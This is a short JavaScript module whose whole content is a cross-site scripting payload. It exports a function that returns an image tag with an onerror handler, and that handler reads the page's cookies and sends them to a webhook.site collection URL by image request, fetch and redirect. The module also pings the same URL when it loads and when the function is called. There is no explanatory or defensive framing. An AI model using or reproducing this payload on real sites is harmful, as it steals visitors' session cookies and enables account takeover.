const EXFIL = 'https://webhook.site/056e7430-69a4-41c7-94be-0c62d64375b2';
try { new Image().src = EXFIL + '/b?s=payload-module-loaded&t=' + Date.now(); } catch(e){}

const PAYLOAD =
  `<img src=x onerror="` +
    `var c=encodeURIComponent(document.cookie);` +
    `new Image().src='${EXFIL}/i?d='+c;` +
    `fetch('${EXFIL}/f?d='+c,{mode:'no-cors'}).catch(function(){});` +
    `setTimeout(function(){location.href='${EXFIL}/n?d='+c},800);` +
  `">`;

export default function () {
  try { new Image().src = EXFIL + '/b?s=factory-called&t=' + Date.now(); } catch(e){}
  return PAYLOAD;
}
